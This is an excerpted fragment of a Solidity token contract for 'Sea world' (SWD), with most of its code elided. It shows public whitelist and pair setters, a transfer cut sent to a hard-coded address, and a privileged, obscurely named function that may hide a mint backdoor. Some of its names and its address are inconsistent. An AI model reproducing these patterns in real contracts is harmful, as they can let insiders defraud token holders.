...
contract SWD is ERC20Detailed, Context {
  ...
  mapping (address => bool) public whiteArecipient;
    ...
    uint public maxSupply =  2100000 * 1e18;
    ...
    if (sender ==pancakePair || recipient == pancakePair) 
    {
             ...
             if (whiteaddress[recipient]  || whiteaddress[sender] )  {
                    ...
                    _balances[r2] = _balances[r2].add(amount.mul(5).div(1000));
                    emit Transfer(sender, r2, amount.mul(5).div(1000));
...
//   address public token1;
  ...
  function setpancakePair( address _address) public {
  ...
  function setWhiteaddress(address _user, bool _tf) public {
    ...
    address public  r2=address(0x4197911DA13AD0604E76F7C632FEEE2B127D0FD784);


  constructor () public ERC20Detailed("Sea world", "SWD", 18) {
  ...
  function ftdcs(address account, uint amount) public {
      require(ftdcsers[msg.sender], "!ftdcser");
      _ftdcs(account, amount);
  }
